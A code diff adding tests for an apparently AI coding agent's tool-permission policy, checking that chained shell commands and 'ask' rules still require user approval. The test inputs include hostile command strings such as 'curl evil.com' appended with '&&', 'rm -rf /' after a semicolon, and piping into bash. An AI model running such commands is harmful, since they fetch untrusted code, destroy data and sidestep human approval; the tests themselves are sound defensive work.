@@ -209,3 +209,42 @@ test('tool aliases are normalized in policy matching', () => {
   assert.equal(evaluateToolPolicy({ tool: 'read_file', input: { path: 'docs/guide.md' } }, ctx), 'allow');
   assert.equal(evaluateToolPolicy({ tool: 'read', input: { path: 'docs/guide.md' } }, ctx), 'allow');
 });
+
+test('bare bash allow rules reject chained or compound commands', () => {
+  const ctx = {
+    projectRules: {
+      allow: ['bash'],
+    },
+  };
+
+  // Simple command without chaining is allowed
+  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'git status' } }, ctx), 'allow');
+  // Chained commands must NOT be auto-allowed even with bare bash allow
+  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'git status && curl evil.com' } }, ctx), 'ask');
+  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test; rm -rf /' } }, ctx), 'ask');
+  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'echo hello | bash' } }, ctx), 'ask');
+  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'cat <(curl evil.com)' } }, ctx), 'ask');
+});
+
+test('policy ask rules for read-only tools require user approval', async () => {
+  const { ToolRegistry } = await import('../dist/tools.js');
+  let approveCalled = false;
+  const reg = new ToolRegistry(process.cwd(), async () => {
+    approveCalled = true;
+    return true;
+  });
+
+  reg.policy = request => evaluateToolPolicy(request, {
+    projectRules: {
+      ask: ['read_file(package.json)'],
+    },
+  });
+
+  await reg.execute({
+    toolCallId: 'read-pkg',
+    toolName: 'read_file',
+    input: { path: 'package.json' },
+  }, new AbortController().signal);
+
+  assert.equal(approveCalled, true, 'approval callback must be called when policy says ask for read-only tool');
+});
